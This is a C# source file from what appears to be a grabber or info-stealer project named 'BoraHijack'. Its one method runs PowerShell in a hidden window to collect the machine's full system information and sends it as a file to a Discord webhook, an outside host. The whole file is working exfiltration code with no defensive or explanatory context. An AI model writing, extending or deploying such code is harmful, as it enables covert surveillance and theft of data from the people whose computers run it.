using Discord;
using Discord.Webhook;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
#pragma warning disable CS0028

namespace BoraHijack.Grabbers
{
    class GrabCompInfo
    {
        public static async Task MainComp(string webhookUrl)
        {
            // Run PowerShell to get system info
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "Get-ComputerInfo | Out-String",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            string output;
            using (var process = Process.Start(psi))
            {
                output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            }

            // Save output to memory stream
            var ms = new MemoryStream();
            var writer = new StreamWriter(ms);
            writer.Write(output);
            writer.Flush();
            ms.Position = 0;

            // Create webhook client
            var client = new DiscordWebhookClient(webhookUrl);

            await client.SendFileAsync(
                ms,
                filename: "ComputerInfo.txt",
                text: "",
                isTTS: false,
                embeds: null,
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png"
            );
        }
    }
}
